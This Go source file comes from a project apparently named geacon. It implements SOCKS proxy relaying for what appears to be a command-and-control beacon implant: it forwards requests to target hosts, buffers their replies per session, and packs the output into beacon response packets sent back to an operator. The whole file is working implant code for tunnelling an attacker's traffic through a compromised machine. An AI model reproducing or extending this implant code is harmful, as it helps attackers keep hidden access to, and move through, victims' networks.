package packet

import (
	"geacon/cmd/config"
	"fmt"
)

func SocksSendReq(sess *config.SocksSession, req []byte) {
	sess.Conn.Write(req)
	fmt.Printf("[SOCKS] Sent data to target %s:%d\n", sess.Address, sess.Port)
}

func SocksResListen(sess *config.SocksSession) {
	for {
		outBuf := make([]byte, 8*1024)
		bytesRead, err := sess.Conn.Read(outBuf[:])
		if bytesRead > 0 {
			fmt.Printf("[SOCKS] Read output larger than 0 from host %s:%d\n", sess.Address, sess.Port)
			fmt.Printf("[SOCKS] Received data: \n[SOCKS] [%x]\n", outBuf[:bytesRead])
			sess.OutBuf = append(sess.OutBuf, outBuf[:bytesRead]...)
		}
		if err != nil {
			break
		}
	}
}

func CheckSocksOutput() []byte {
	resultBuf := make([]byte, 0, 90000)
	fmt.Printf("Checking SOCKS responses...\n")
	for _, session := range config.SocksSessions {
		fmt.Printf("[SOCKS] Checking session %d with outbuf of [%x]", session.Id, session.OutBuf)
		if len(session.OutBuf) > 0 {
			// read data, then set to empty buffer again
			fmt.Printf("\n[SOCKS] Output for session %d is larger than 0\n Sending: [%x]\n\n", session.Id, session.OutBuf)
			outputPacket := MakePacket(BEACON_RSP_SOCKS_WRITE, append(WriteInt(session.Id), session.OutBuf...))
			resultBuf = append(resultBuf, outputPacket...)
			session.OutBuf = nil
		}
	}
	return resultBuf
}